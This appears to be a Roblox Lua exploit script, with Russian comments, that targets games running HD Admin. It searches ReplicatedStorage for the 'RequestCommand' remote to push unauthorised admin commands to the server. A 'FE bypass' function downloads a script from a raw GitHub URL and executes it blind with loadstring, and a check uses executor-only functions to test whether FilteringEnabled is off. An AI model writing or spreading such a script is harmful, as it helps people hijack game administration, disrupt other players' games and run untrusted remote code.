local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

-- ========== HD ADMIN REMOTE ==========
local RequestCommand = nil
pcall(function()
    local HDAdminHDClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
    if HDAdminHDClient and HDAdminHDClient.Signals then
        RequestCommand = HDAdminHDClient.Signals:FindFirstChild("RequestCommand")
    end
    if not RequestCommand then
        for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
            if child.Name == "RequestCommand" and child:IsA("RemoteFunction") then
                RequestCommand = child
                break
            end
        end
    end
end)

-- Отправка команды с префиксом "/"
local function sendCommand(cmd)
    if not RequestCommand then return end
    pcall(RequestCommand.InvokeServer, RequestCommand, "/" .. cmd)
end

-- ========== FE BYPASS: ТОЛЬКО ВЫПОЛНЕНИЕ ССЫЛКИ ==========
local function runFEBypass()
    local url = "https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"
    local ok, res = pcall(game.HttpGet, game, url)
    if ok and res then
        local fn, err = loadstring(res)
        if fn then
            pcall(fn)
        end
    end
end

-- ========== CHECK FE: ОДНОРАЗОВАЯ ПРОВЕРКА ==========
local function checkFEOnce()
    if Workspace.FilteringEnabled == false then return true end
    if ReplicatedStorage.FilteringEnabled == false then return true end
    if Lighting.FilteringEnabled == false then return true end
    if _G.FE_BYPASS_ACTIVE == true then return true end
    if _G.FilteringEnabled == false then return true end
    local mt = getrawmetatable(Workspace)
    if mt and mt.__index then
        local val = mt.__index(Workspace, "FilteringEnabled")
        if val == false then return true end
    end
    return false
end

